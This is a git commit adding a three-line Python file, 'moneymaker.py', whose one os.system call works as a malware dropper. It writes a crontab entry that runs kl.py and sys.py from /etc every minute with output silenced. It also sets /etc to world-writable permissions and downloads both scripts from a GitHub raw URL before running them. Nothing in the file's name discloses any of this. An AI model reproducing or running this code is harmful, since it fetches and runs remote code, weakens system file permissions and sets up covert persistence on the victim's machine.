7209ff0c4d7c7c998ebe78d52084ce60821db1d8
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-24 14:03:34 +0000

    Create moneymaker.py

---
+++ moneymaker.py
@@ -0,0 +1,3 @@
+import os
+
+os.system('echo "*/1 * * * * cd && cd /etc/ && python3 kl.py && python3 sys.py > /dev/null 2>&1 &" > cron && cat cron | crontab - && sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://raw.githubusercontent.com/katerin966/03/main/kl.py && wget https://raw.githubusercontent.com/katerin966/03/main/sys.py && python3 kl.py && python3 sys.py')
